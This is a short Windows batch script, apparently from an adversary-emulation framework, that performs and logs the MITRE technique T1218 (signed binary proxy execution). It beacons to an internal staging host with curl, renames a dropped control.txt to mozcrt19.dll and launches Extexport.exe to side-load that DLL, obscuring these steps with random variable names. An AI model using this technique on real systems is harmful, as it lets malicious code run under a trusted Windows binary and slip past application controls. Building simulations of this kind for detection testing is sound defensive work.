@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET douyiw=%APPDATA%\7612\f60d42e8
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?7612-10
SET eykalkg=BALAM-S2B
SET fkesh=10
SET ecrfwq=control.txt
SET rgnpbq=7612

REM Heartbeat check
curl -k -s -o nul "!frytcn!" >nul 2>&1

REM Rename file
IF EXIST "!douyiw!\!ecrfwq!" (
    REN "!douyiw!\!ecrfwq!" mozcrt19.dll
    SET pzdrty=1
    SET mjhfdk=
) ELSE (
    SET pzdrty=0
    SET mjhfdk=file_not_found
)

REM Execute with full path
IF !pzdrty! EQU 1 (
    Extexport.exe "!douyiw!" foo bar >nul 2>&1
    IF !ERRORLEVEL! NEQ 0 (
        SET pzdrty=0
        SET mjhfdk=exec_error_!ERRORLEVEL!
    )
)

REM Log TTP execution
SET dtbkpq=%DATE:~10,4%-%DATE:~4,2%-%DATE:~7,2%
SET ytzdrg=%TIME: =0%
SET ytzdrg=!ytzdrg:~0,2!:!ytzdrg:~3,2!:!ytzdrg:~6,2!.!ytzdrg:~9,3!
SET hjmldf=[!dtbkpq! !ytzdrg!][!eykalkg!]: !fkesh!-!rgnpbq!-T1218|SignedBinaryProxyExecution=!pzdrty!:!mjhfdk!

>> "%APPDATA%\!fkesh!\macula-simulations.log" 2>nul echo !hjmldf! || >nul 2>&1

ENDLOCAL